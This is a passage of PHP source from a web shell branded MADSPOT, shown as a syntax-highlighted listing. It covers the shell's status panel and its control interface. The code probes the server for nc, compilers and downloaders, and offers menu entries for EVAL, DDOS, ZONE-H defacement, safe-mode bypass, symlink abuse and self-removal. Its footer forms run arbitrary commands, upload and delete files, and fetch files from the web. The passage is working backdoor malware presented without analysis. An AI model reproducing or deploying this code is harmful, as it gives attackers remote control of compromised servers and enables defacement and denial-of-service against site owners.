<span class="lineno"> 410</span> <span class="s1">    &amp;lt;/tr&amp;gt;&#39;</span><span class="p">;</span>
<span class="lineno"> 411</span>   
<span class="lineno"> 412</span>      <span class="k">if</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;sys&#39;</span><span class="p">]</span><span class="o">==</span><span class="s1">&#39;unix&#39;</span> <span class="p">)</span>
<span class="lineno"> 413</span> <span class="p">{</span>
<span class="lineno"> 414</span>     <span class="k">if</span><span class="p">(</span><span class="o">!@</span><span class="nb">ini_get</span><span class="p">(</span><span class="s1">&#39;safe_mode&#39;</span><span class="p">))</span>
<span class="lineno"> 415</span>     <span class="p">{</span>
<span class="lineno"> 416</span>     
<span class="lineno"> 417</span>     <span class="k">echo</span> <span class="s1">&#39;&amp;lt;tr&amp;gt;&amp;lt;td height=&quot;18&quot; colspan=&quot;2&quot;&amp;gt;&amp;lt;span&amp;gt;Useful : &amp;lt;/span&amp;gt;&#39;</span><span class="p">;</span>
<span class="lineno"> 418</span>     <span class="nv">$userful</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;gcc&#39;</span><span class="p">,</span><span class="s1">&#39;lcc&#39;</span><span class="p">,</span><span class="s1">&#39;cc&#39;</span><span class="p">,</span><span class="s1">&#39;ld&#39;</span><span class="p">,</span><span class="s1">&#39;make&#39;</span><span class="p">,</span><span class="s1">&#39;php&#39;</span><span class="p">,</span><span class="s1">&#39;perl&#39;</span><span class="p">,</span><span class="s1">&#39;python&#39;</span><span class="p">,</span><span class="s1">&#39;ruby&#39;</span><span class="p">,</span><span class="s1">&#39;tar&#39;</span><span class="p">,</span><span class="s1">&#39;gzip&#39;</span><span class="p">,</span><span class="s1">&#39;bzip&#39;</span><span class="p">,</span><span class="s1">&#39;bzip2&#39;</span><span class="p">,</span><span class="s1">&#39;nc&#39;</span><span class="p">,</span><span class="s1">&#39;locate&#39;</span><span class="p">,</span><span class="s1">&#39;suidperl&#39;</span><span class="p">);</span>
<span class="lineno"> 419</span>      <span class="k">foreach</span><span class="p">(</span><span class="nv">$userful</span> <span class="k">as</span> <span class="nv">$item</span><span class="p">)</span>
<span class="lineno"> 420</span>          <span class="k">if</span><span class="p">(</span><span class="nx">madWhich</span><span class="p">(</span><span class="nv">$item</span><span class="p">))</span>
<span class="lineno"> 421</span>          <span class="k">echo</span> <span class="nv">$item</span><span class="o">.</span><span class="s1">&#39;,&#39;</span><span class="p">;</span>
<span class="lineno"> 422</span>          <span class="k">echo</span> <span class="s1">&#39;&amp;lt;/td&amp;gt;</span>
<span class="lineno"> 423</span> <span class="s1">         &amp;lt;/tr&amp;gt;</span>
<span class="lineno"> 424</span> <span class="s1">          &amp;lt;tr&amp;gt;</span>
<span class="lineno"> 425</span> <span class="s1">          &amp;lt;td height=&quot;0&quot; colspan=&quot;2&quot;&amp;gt;&amp;lt;span&amp;gt;Downloader:&amp;lt;/span&amp;gt;&#39;</span><span class="p">;</span>
<span class="lineno"> 426</span>          
<span class="lineno"> 427</span>      <span class="nv">$downloaders</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;wget&#39;</span><span class="p">,</span><span class="s1">&#39;fetch&#39;</span><span class="p">,</span><span class="s1">&#39;lynx&#39;</span><span class="p">,</span><span class="s1">&#39;links&#39;</span><span class="p">,</span><span class="s1">&#39;curl&#39;</span><span class="p">,</span><span class="s1">&#39;get&#39;</span><span class="p">,</span><span class="s1">&#39;lwp-mirror&#39;</span><span class="p">);</span>
<span class="lineno"> 428</span>       <span class="k">foreach</span><span class="p">(</span><span class="nv">$downloaders</span> <span class="k">as</span> <span class="nv">$item2</span><span class="p">)</span>
<span class="lineno"> 429</span>        <span class="k">if</span><span class="p">(</span><span class="nx">madWhich</span><span class="p">(</span><span class="nv">$item2</span><span class="p">))</span>
<span class="lineno"> 430</span>         <span class="k">echo</span> <span class="nv">$item2</span><span class="o">.</span><span class="s1">&#39;,&#39;</span><span class="p">;</span>
<span class="lineno"> 431</span>         <span class="k">echo</span> <span class="s1">&#39;&amp;lt;/td&amp;gt;</span>
<span class="lineno"> 432</span> <span class="s1">              &amp;lt;/tr&amp;gt;&#39;</span><span class="p">;</span>
<span class="lineno"> 433</span>          
<span class="lineno"> 434</span>           <span class="p">}</span>
<span class="lineno"> 435</span>            <span class="k">else</span> 
<span class="lineno"> 436</span>            <span class="p">{</span>
<span class="lineno"> 437</span>          <span class="k">echo</span> <span class="s1">&#39;&amp;lt;tr&amp;gt;&amp;lt;td height=&quot;18&quot; colspan=&quot;2&quot;&amp;gt;&amp;lt;span&amp;gt;useful:&amp;lt;/span&amp;gt;&#39;</span><span class="p">;</span> 
<span class="lineno"> 438</span>          <span class="k">echo</span> <span class="s1">&#39;--------------&amp;lt;/td&amp;gt;</span>
<span class="lineno"> 439</span> <span class="s1">           &amp;lt;/tr&amp;gt;&amp;lt;td height=&quot;0&quot; colspan=&quot;2&quot;&amp;gt;&amp;lt;span&amp;gt;Downloader: &amp;lt;/span&amp;gt;-------------&amp;lt;/td&amp;gt;</span>
<span class="lineno"> 440</span> <span class="s1">              &amp;lt;/tr&amp;gt;&#39;</span><span class="p">;</span>  
<span class="lineno"> 441</span>          <span class="p">}</span>
<span class="lineno"> 442</span> <span class="p">}</span>
<span class="lineno"> 443</span> <span class="k">else</span>
<span class="lineno"> 444</span> <span class="p">{</span>
<span class="lineno"> 445</span>    <span class="k">echo</span> <span class="s1">&#39;&amp;lt;tr&amp;gt;&amp;lt;td height=&quot;18&quot; colspan=&quot;2&quot;&amp;gt;&amp;lt;span&amp;gt;Window:&amp;lt;/span&amp;gt;&#39;</span><span class="p">;</span>
<span class="lineno"> 446</span>    <span class="k">echo</span> <span class="nx">madEx</span><span class="p">(</span><span class="s1">&#39;ver&#39;</span><span class="p">);</span>
<span class="lineno"> 447</span>    <span class="k">echo</span> <span class="s1">&#39;&amp;lt;/td&amp;gt;</span>
<span class="lineno"> 448</span> <span class="s1">         &amp;lt;/tr&amp;gt; &amp;lt;tr&amp;gt;</span>
<span class="lineno"> 449</span> <span class="s1">        &amp;lt;td height=&quot;0&quot; colspan=&quot;2&quot;&amp;gt;&amp;lt;span&amp;gt;Downloader: &amp;lt;/span&amp;gt;-------------&amp;lt;/td&amp;gt;</span>
<span class="lineno"> 450</span> <span class="s1">              &amp;lt;/tr&amp;gt;&#39;</span><span class="p">;</span> 
<span class="lineno"> 451</span>     
<span class="lineno"> 452</span> <span class="p">}</span>  
<span class="lineno"> 453</span>     
<span class="lineno"> 454</span>  
<span class="lineno"> 455</span>  <span class="k">echo</span> <span class="s1">&#39;&amp;lt;tr&amp;gt;</span>
<span class="lineno"> 456</span> <span class="s1">    &amp;lt;td height=&quot;16&quot; colspan=&quot;2&quot;&amp;gt;&amp;lt;span&amp;gt;Disabled functions:&amp;lt;/span&amp;gt;&#39;</span><span class="o">.</span><span class="nv">$disfun</span><span class="o">.</span><span class="s1">&#39;&amp;lt;/td&amp;gt;</span>
<span class="lineno"> 457</span> <span class="s1">  &amp;lt;/tr&amp;gt;</span>
<span class="lineno"> 458</span> <span class="s1">  &amp;lt;tr&amp;gt;</span>
<span class="lineno"> 459</span> <span class="s1">    &amp;lt;td height=&quot;16&quot; colspan=&quot;2&quot;&amp;gt;&amp;lt;span&amp;gt;cURL:&#39;</span><span class="o">.</span><span class="nv">$curl</span><span class="o">.</span><span class="s1">&#39;  MySQL:&#39;</span><span class="o">.</span><span class="nv">$mysql</span><span class="o">.</span><span class="s1">&#39;  MSSQL:&#39;</span><span class="o">.</span><span class="nv">$mssql</span><span class="o">.</span><span class="s1">&#39;  PostgreSQL:&#39;</span><span class="o">.</span><span class="nv">$pg</span><span class="o">.</span><span class="s1">&#39;  Oracle: &amp;lt;/span&amp;gt;&#39;</span><span class="o">.</span><span class="nv">$or</span><span class="o">.</span><span class="s1">&#39;&amp;lt;/td&amp;gt;&amp;lt;td width=&quot;15%&quot;&amp;gt;&#39;</span><span class="o">.</span><span class="nb">base64_decode</span><span class="p">(</span><span class="s2">&quot;PGEgaHJlZj0iaHR0cDovL3d3dy5tYWRzcG90Lm5ldCIgdGFyZ2V0PSJfYmxhbmsiPjxzcGFuPjxmb250IGNvbG9yPSIjMEYwIj4mbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDtNQURTUE9ULk5FVDwvZm9udD48L3NwYW4+PC9hPg==&quot;</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;&amp;lt;/td&amp;gt;</span>
<span class="lineno"> 460</span> <span class="s1">  &amp;lt;/tr&amp;gt;</span>
<span class="lineno"> 461</span> <span class="s1">  &amp;lt;tr&amp;gt;</span>
<span class="lineno"> 462</span> <span class="s1">  &amp;lt;td height=&quot;11&quot; colspan=&quot;3&quot;&amp;gt;&amp;lt;span&amp;gt;Open_basedir:&#39;</span><span class="o">.</span><span class="nv">$open_b</span><span class="o">.</span><span class="s1">&#39; Safe_mode_exec_dir:&#39;</span><span class="o">.</span><span class="nv">$safe_exe</span><span class="o">.</span><span class="s1">&#39;   Safe_mode_include_dir:&#39;</span><span class="o">.</span><span class="nv">$safe_include</span><span class="o">.</span><span class="s1">&#39;&amp;lt;/td&amp;gt;</span>
<span class="lineno"> 463</span> <span class="s1">  &amp;lt;/tr&amp;gt;</span>
<span class="lineno"> 464</span> <span class="s1">  &amp;lt;tr&amp;gt;</span>
<span class="lineno"> 465</span> <span class="s1">    &amp;lt;td height=&quot;11&quot;&amp;gt;&amp;lt;span&amp;gt;Server &amp;lt;/span&amp;gt;&amp;lt;/td&amp;gt;</span>
<span class="lineno"> 466</span> <span class="s1">    &amp;lt;td colspan=&quot;2&quot;&amp;gt;&#39;</span><span class="o">.@</span><span class="nb">getenv</span><span class="p">(</span><span class="s1">&#39;SERVER_SOFTWARE&#39;</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;&amp;lt;/td&amp;gt;</span>
<span class="lineno"> 467</span> <span class="s1">  &amp;lt;/tr&amp;gt;&#39;</span><span class="p">;</span>
<span class="lineno"> 468</span>   <span class="k">if</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="nx">sys</span><span class="p">]</span><span class="o">==</span><span class="s2">&quot;win&quot;</span><span class="p">)</span>
<span class="lineno"> 469</span>   <span class="p">{</span>
<span class="lineno"> 470</span>     <span class="k">echo</span> <span class="s1">&#39;&amp;lt;tr&amp;gt;</span>
<span class="lineno"> 471</span> <span class="s1">    &amp;lt;td height=&quot;12&quot;&amp;gt;&amp;lt;span&amp;gt;DRIVE:&amp;lt;/span&amp;gt;&amp;lt;/td&amp;gt;</span>
<span class="lineno"> 472</span> <span class="s1">    &amp;lt;td colspan=&quot;2&quot;&amp;gt;&#39;</span><span class="o">.</span><span class="nv">$drives</span><span class="o">.</span><span class="s1">&#39;&amp;lt;/td&amp;gt;</span>
<span class="lineno"> 473</span> <span class="s1">     &amp;lt;/tr&amp;gt;&#39;</span><span class="p">;</span>
<span class="lineno"> 474</span>   <span class="p">}</span>
<span class="lineno"> 475</span>   
<span class="lineno"> 476</span>   <span class="k">echo</span> <span class="s1">&#39;&amp;lt;tr&amp;gt;</span>
<span class="lineno"> 477</span> <span class="s1">    &amp;lt;td height=&quot;12&quot;&amp;gt;&amp;lt;span&amp;gt;PWD:&amp;lt;/span&amp;gt;&amp;lt;/td&amp;gt;</span>
<span class="lineno"> 478</span> <span class="s1">    &amp;lt;td colspan=&quot;2&quot;&amp;gt;&#39;</span><span class="o">.</span><span class="nv">$cwd_links</span><span class="o">.</span><span class="s1">&#39;  &amp;lt;a href=# onclick=&quot;g(\&#39;FilesMan\&#39;,\&#39;&#39;</span> <span class="o">.</span> <span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;home_cwd&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s1">&#39;\&#39;,\&#39;\&#39;,\&#39;\&#39;,\&#39;\&#39;)&quot;&amp;gt;&amp;lt;font color=red &amp;gt;|CURRENT|&amp;lt;/font&amp;gt;&amp;lt;/a&amp;gt;&amp;lt;/td&amp;gt;</span>
<span class="lineno"> 479</span> <span class="s1">  &amp;lt;/tr&amp;gt;</span>
<span class="lineno"> 480</span> <span class="s1">  &amp;lt;/table&amp;gt;</span>
<span class="lineno"> 481</span> <span class="s1">&amp;lt;/div&amp;gt;</span>
<span class="lineno"> 482</span> <span class="s1"> &amp;lt;div id=&quot;meunlist&quot;&amp;gt;</span>
<span class="lineno"> 483</span> <span class="s1">      &amp;lt;ul&amp;gt;</span>
<span class="lineno"> 484</span> <span class="s1">&amp;lt;li&amp;gt;&amp;lt;a href=&quot;#&quot; onclick=&quot;g(\&#39;FilesMan\&#39;,null,\&#39;\&#39;,\&#39;\&#39;,\&#39;\&#39;)&quot;&amp;gt;HOME&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;</span>
<span class="lineno"> 485</span> 
<span class="lineno"> 486</span> <span class="s1">&amp;lt;li&amp;gt;&amp;lt;a href=&quot;#&quot; onclick=&quot;g(\&#39;proc\&#39;,null,\&#39;\&#39;,\&#39;\&#39;,\&#39;\&#39;)&quot;&amp;gt;PROCESS&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;</span>
<span class="lineno"> 487</span> <span class="s1">&amp;lt;li&amp;gt;&amp;lt;a href=&quot;#&quot; onclick=&quot;g(\&#39;phpeval\&#39;,null,\&#39;\&#39;,\&#39;\&#39;,\&#39;\&#39;)&quot;&amp;gt;EVAL&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;</span>
<span class="lineno"> 488</span> <span class="s1">&amp;lt;li&amp;gt;&amp;lt;a href=&quot;#&quot; onclick=&quot;g(\&#39;sql\&#39;,null,\&#39;\&#39;,\&#39;\&#39;,\&#39;\&#39;)&quot;&amp;gt;SQL&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;</span>
<span class="lineno"> 489</span> <span class="s1">&amp;lt;li&amp;gt;&amp;lt;a href=&quot;#&quot; onclick=&quot;g(\&#39;hash\&#39;,null,\&#39;\&#39;,\&#39;\&#39;,\&#39;\&#39;)&quot;&amp;gt;HASH&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;</span>
<span class="lineno"> 490</span> <span class="s1">&amp;lt;li&amp;gt;&amp;lt;a href=&quot;#&quot; onclick=&quot;g(\&#39;connect\&#39;,null,\&#39;\&#39;,\&#39;\&#39;,\&#39;\&#39;)&quot;&amp;gt;CONNECT&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;</span>
<span class="lineno"> 491</span> <span class="s1">&amp;lt;li&amp;gt;&amp;lt;a href=&quot;#&quot; onclick=&quot;g(\&#39;zoneh\&#39;,null,\&#39;\&#39;,\&#39;\&#39;,\&#39;\&#39;)&quot;&amp;gt;ZONE-H&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;</span>
<span class="lineno"> 492</span> <span class="s1">&amp;lt;li&amp;gt;&amp;lt;a href=&quot;#&quot; onclick=&quot;g(\&#39;dos\&#39;,null,\&#39;\&#39;,\&#39;\&#39;,\&#39;\&#39;)&quot;&amp;gt;DDOS&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;</span>
<span class="lineno"> 493</span> <span class="s1">&amp;lt;li&amp;gt;&amp;lt;a href=&quot;#&quot; onclick=&quot;g(\&#39;safe\&#39;,null,\&#39;\&#39;,\&#39;\&#39;,\&#39;\&#39;)&quot;&amp;gt;SAFE MODE&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;</span>
<span class="lineno"> 494</span> <span class="s1">&amp;lt;li&amp;gt;&amp;lt;a href=&quot;#&quot; onclick=&quot;g(\&#39;symlink\&#39;,null,\&#39;\&#39;,\&#39;\&#39;,\&#39;\&#39;)&quot;&amp;gt;SYMLINK&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;</span>
<span class="lineno"> 495</span> <span class="s1">&amp;lt;li&amp;gt;&amp;lt;a href=&quot;#&quot; onclick=&quot;g(\&#39;spot\&#39;,null,\&#39;\&#39;,\&#39;\&#39;,\&#39;\&#39;)&quot;&amp;gt;MADSPOT&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;</span>
<span class="lineno"> 496</span> <span class="s1">&amp;lt;li&amp;gt;&amp;lt;a href=&quot;#&quot; onclick=&quot;g(\&#39;selfrm\&#39;,null,\&#39;\&#39;,\&#39;\&#39;,\&#39;\&#39;)&quot;&amp;gt;KIll C0de&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;</span>
<span class="lineno"> 497</span> <span class="s1">&amp;lt;/ul&amp;gt;</span>
<span class="lineno"> 498</span> <span class="s1">    </span>
<span class="lineno"> 499</span> <span class="s1">    &amp;lt;/div&amp;gt;</span>
<span class="lineno"> 500</span> <span class="s1">&#39;</span><span class="p">;</span>   
<span class="lineno"> 501</span>     
<span class="lineno"> 502</span> <span class="p">}</span>
<span class="lineno"> 503</span> 
<span class="lineno"> 504</span> <span class="k">function</span> <span class="nf">madfooter</span><span class="p">()</span>
<span class="lineno"> 505</span> <span class="p">{</span>
<span class="lineno"> 506</span>     
<span class="lineno"> 507</span>     <span class="k">echo</span> <span class="s2">&quot;&amp;lt;table class=&#39;foot&#39; width=&#39;100%&#39; border=&#39;0&#39; cellspacing=&#39;3&#39; cellpadding=&#39;0&#39; &amp;gt;</span>
<span class="lineno"> 508</span> <span class="s2">       &amp;lt;tr&amp;gt;</span>
<span class="lineno"> 509</span> <span class="s2">         &amp;lt;td width=&#39;17%&#39;&amp;gt;&amp;lt;form onsubmit=</span><span class="se">\&quot;</span><span class="s2">g(&#39;FilesTools&#39;,null,this.f.value,&#39;mkfile&#39;);return false;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;span&amp;gt;__MK FILE__&amp;lt;/span&amp;gt;&amp;lt;br&amp;gt;&amp;lt;input class=&#39;dir&#39;  type=text name=f value=&#39;&#39;&amp;gt;&amp;lt;input type=submit value=&#39;&amp;gt;&amp;gt;&#39;&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;/td&amp;gt;</span>
<span class="lineno"> 510</span> <span class="s2">         &amp;lt;td width=&#39;21%&#39;&amp;gt;&amp;lt;form onsubmit=</span><span class="se">\&quot;</span><span class="s2">g(&#39;FilesMan&#39;,null,&#39;mkdir&#39;,this.d.value);return false;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;span&amp;gt;__MK DIR__&amp;lt;/span&amp;gt;&amp;lt;br&amp;gt;&amp;lt;input class=&#39;dir&#39; type=text name=d value=&#39;&#39;&amp;gt;&amp;lt;input type=submit value=&#39;&amp;gt;&amp;gt;&#39;&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;/td&amp;gt;</span>
<span class="lineno"> 511</span> <span class="s2">         &amp;lt;td width=&#39;22%&#39;&amp;gt;&amp;lt;form onsubmit=</span><span class="se">\&quot;</span><span class="s2">g(&#39;FilesMan&#39;,null,&#39;delete&#39;,this.del.value);return false;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;span&amp;gt;__DELETE__&amp;lt;/span&amp;gt;&amp;lt;br&amp;gt;&amp;lt;input class=&#39;dir&#39; type=text name=del value=&#39;&#39;&amp;gt;&amp;lt;input type=submit value=&#39;&amp;gt;&amp;gt;&#39;&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;/td&amp;gt;</span>
<span class="lineno"> 512</span> <span class="s2">         &amp;lt;td width=&#39;19%&#39;&amp;gt;&amp;lt;form onsubmit=</span><span class="se">\&quot;</span><span class="s2">g(&#39;FilesTools&#39;,null,this.f.value,&#39;chmod&#39;);return false;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;span&amp;gt;__CHMOD__&amp;lt;/span&amp;gt;&amp;lt;br&amp;gt;&amp;lt;input class=&#39;dir&#39; type=text name=f value=&#39;&#39;&amp;gt;&amp;lt;input type=submit value=&#39;&amp;gt;&amp;gt;&#39;&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;/td&amp;gt;</span>
<span class="lineno"> 513</span> <span class="s2">       &amp;lt;/tr&amp;gt;</span>
<span class="lineno"> 514</span> <span class="s2">       &amp;lt;tr&amp;gt;</span>
<span class="lineno"> 515</span> <span class="s2">         &amp;lt;td colspan=&#39;2&#39;&amp;gt;&amp;lt;form onsubmit=&#39;g(null,this.c.value,</span><span class="se">\&quot;\&quot;</span><span class="s2">);return false;&#39;&amp;gt;&amp;lt;span&amp;gt;__CHANGE DIR__&amp;lt;/span&amp;gt;&amp;lt;br&amp;gt;&amp;lt;input class=&#39;foottable&#39; type=text name=c value=&#39;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">])</span><span class="o">.</span><span class="s2">&quot;&#39;&amp;gt;&amp;lt;input type=submit value=&#39;&amp;gt;&amp;gt;&#39;&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;/td&amp;gt;</span>
<span class="lineno"> 516</span> <span class="s2">         &amp;lt;td colspan=&#39;2&#39;&amp;gt;&amp;lt;form method=&#39;post&#39; &amp;gt;&amp;lt;span&amp;gt;__HTTP DOWNLOAD__&amp;lt;/span&amp;gt;&amp;lt;br&amp;gt;&amp;lt;input class=&#39;foottable&#39; type=text name=rtdown value=&#39;&#39;&amp;gt;&amp;lt;input type=submit value=&#39;&amp;gt;&amp;gt;&#39;&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;/td&amp;gt;</span>
<span class="lineno"> 517</span> <span class="s2">        &amp;lt;/tr&amp;gt;</span>
<span class="lineno"> 518</span> <span class="s2">       &amp;lt;tr&amp;gt;</span>
<span class="lineno"> 519</span> <span class="s2">         &amp;lt;td colspan=&#39;4&#39;&amp;gt;&amp;lt;form onsubmit=</span><span class="se">\&quot;</span><span class="s2">g(&#39;proc&#39;,null,this.c.value);return false;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;span&amp;gt;__EXECUTE__&amp;lt;/span&amp;gt;&amp;lt;br&amp;gt;&amp;lt;input class=&#39;foottable&#39; type=text name=c value=&#39;&#39;&amp;gt;&amp;lt;input type=submit value=&#39;&amp;gt;&amp;gt;&#39;&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;/td&amp;gt;</span>
<span class="lineno"> 520</span> <span class="s2">        &amp;lt;/tr&amp;gt;</span>
<span class="lineno"> 521</span> <span class="s2">       &amp;lt;tr&amp;gt;</span>
<span class="lineno"> 522</span> <span class="s2">         &amp;lt;td colspan=&#39;4&#39;&amp;gt;&amp;lt;form method=&#39;post&#39; ENCTYPE=&#39;multipart/form-data&#39;&amp;gt;</span>
<span class="lineno"> 523</span> <span class="s2">      &amp;lt;input type=hidden name=a value=&#39;FilesMAn&#39;&amp;gt;</span>
<span class="lineno"> 524</span> <span class="s2">      &amp;lt;input type=hidden name=c value=&#39;&quot;</span> <span class="o">.</span> <span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">]</span> <span class="o">.</span><span class="s2">&quot;&#39;&amp;gt;</span>
<span class="lineno"> 525</span> <span class="s2">      &amp;lt;input type=hidden name=p1 value=&#39;uploadFile&#39;&amp;gt;</span>
<span class="lineno"> 526</span> <span class="s2">      &amp;lt;input type=hidden name=charset value=&#39;&quot;</span> <span class="o">.</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;charset&#39;</span><span class="p">])</span><span class="o">?</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;charset&#39;</span><span class="p">]</span><span class="o">:</span><span class="s1">&#39;&#39;</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&quot;&#39;&amp;gt;</span>
<span class="lineno"> 527</span> <span class="s2">        &amp;lt;span&amp;gt;Upload file:&amp;lt;/span&amp;gt;&amp;lt;br&amp;gt;&amp;lt;input class=&#39;toolsInp&#39; type=file name=f&amp;gt;&amp;lt;br /&amp;gt;&amp;lt;input type=submit value=&#39;&amp;gt;&amp;gt;&#39;&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;/td&amp;gt;</span>
<span class="lineno"> 528</span> <span class="s2">        &amp;lt;/tr&amp;gt; </span>
<span class="lineno"> 529</span> <span class="s2">      &amp;lt;/table&amp;gt;</span>
<span class="lineno"> 530</span> <span class="s2">  &amp;lt;/div&amp;gt;</span>
<span class="lineno"> 531</span> <span class="s2">  &amp;lt;/body&amp;gt;</span>
<span class="lineno"> 532</span> <span class="s2">&amp;lt;/html&amp;gt;</span>
<span class="lineno"> 533</span> <span class="s2">&quot;</span><span class="p">;</span>
<span class="lineno"> 534</span>     
<span class="lineno"> 535</span> <span class="p">}</span>
<span class="lineno"> 536</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="s2">&quot;posix_getpwuid&quot;</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="o">@</span><span class="nb">ini_get</span><span class="p">(</span><span class="s1">&#39;disable_functions&#39;</span><span class="p">),</span> <span class="s1">&#39;posix_getpwuid&#39;</span><span class="p">)</span><span class="o">===</span><span class="k">false</span><span class="p">))</span> <span class="p">{</span>
<span class="lineno"> 537</span>    <span class="k">function</span> <span class="nf">posix_getpwuid</span><span class="p">(</span><span class="nv">$p</span><span class="p">)</span> <span class="p">{</span><span class="k">return</span> <span class="k">false</span><span class="p">;}</span> <span class="p">}</span>
<span class="lineno"> 538</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="s2">&quot;posix_getgrgid&quot;</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="o">@</span><span class="nb">ini_get</span><span class="p">(</span><span class="s1">&#39;disable_functions&#39;</span><span class="p">),</span> <span class="s1">&#39;posix_getgrgid&#39;</span><span class="p">)</span><span class="o">===</span><span class="k">false</span><span class="p">))</span> <span class="p">{</span>
<span class="lineno"> 539</span>   <span class="k">function</span> <span class="nf">posix_getgrgid</span><span class="p">(</span><span class="nv">$p</span><span class="p">)</span> <span class="p">{</span><span class="k">return</span> <span class="k">false</span><span class="p">;}</span> <span class="p">}</span>
<span class="lineno"> 540</span> 
<span class="lineno"> 541</span> <span class="k">function</span> <span class="nf">madWhich</span><span class="p">(</span><span class="nv">$p</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 542</span>    <span class="nv">$path</span> <span class="o">=</span> <span class="nx">madEx</span><span class="p">(</span><span class="s1">&#39;which &#39;</span> <span class="o">.</span> <span class="nv">$p</span><span class="p">);</span>
<span class="lineno"> 543</span>    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$path</span><span class="p">))</span>
<span class="lineno"> 544</span>        <span class="k">return</span> <span class="nv">$path</span><span class="p">;</span>
<span class="lineno"> 545</span>    <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
<span class="lineno"> 546</span> <span class="p">}</span>
<span class="lineno"> 547</span> 
<span class="lineno"> 548</span> 
<span class="lineno"> 549</span> 
<span class="lineno"> 550</span> <span class="k">function</span> <span class="nf">madSize</span><span class="p">(</span><span class="nv">$s</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 551</span>    <span class="k">if</span><span class="p">(</span><span class="nv">$s</span> <span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">=</span> <span class="mi">1073741824</span><span class="p">)</span>
<span class="lineno"> 552</span>        <span class="k">return</span> <span class="nb">sprintf</span><span class="p">(</span><span class="s1">&#39;%1.2f&#39;</span><span class="p">,</span> <span class="nv">$s</span> <span class="o">/</span> <span class="mi">1073741824</span> <span class="p">)</span><span class="o">.</span> <span class="s1">&#39; GB&#39;</span><span class="p">;</span>
<span class="lineno"> 553</span>    <span class="k">elseif</span><span class="p">(</span><span class="nv">$s</span> <span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">=</span> <span class="mi">1048576</span><span class="p">)</span>
<span class="lineno"> 554</span>        <span class="k">return</span> <span class="nb">sprintf</span><span class="p">(</span><span class="s1">&#39;%1.2f&#39;</span><span class="p">,</span> <span class="nv">$s</span> <span class="o">/</span> <span class="mi">1048576</span> <span class="p">)</span> <span class="o">.</span> <span class="s1">&#39; MB&#39;</span><span class="p">;</span>
<span class="lineno"> 555</span>    <span class="k">elseif</span><span class="p">(</span><span class="nv">$s</span> <span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">=</span> <span class="mi">1024</span><span class="p">)</span>
<span class="lineno"> 556</span>        <span class="k">return</span> <span class="nb">sprintf</span><span class="p">(</span><span class="s1">&#39;%1.2f&#39;</span><span class="p">,</span> <span class="nv">$s</span> <span class="o">/</span> <span class="mi">1024</span> <span class="p">)</span> <span class="o">.</span> <span class="s1">&#39; KB&#39;</span><span class="p">;</span>
<span class="lineno"> 557</span>    <span class="k">else</span>
<span class="lineno"> 558</span>        <span class="k">return</span> <span class="nv">$s</span> <span class="o">.</span> <span class="s1">&#39; B&#39;</span><span class="p">;</span>
<span class="lineno"> 559</span> <span class="p">}</span>
<span class="lineno"> 560</span> 
<span class="lineno"> 561</span> 
<span class="lineno"> 562</span> <span class="k">function</span> <span class="nf">madPerms</span><span class="p">(</span><span class="nv">$p</span><span class="p">)</span> <span class="p">{</span>
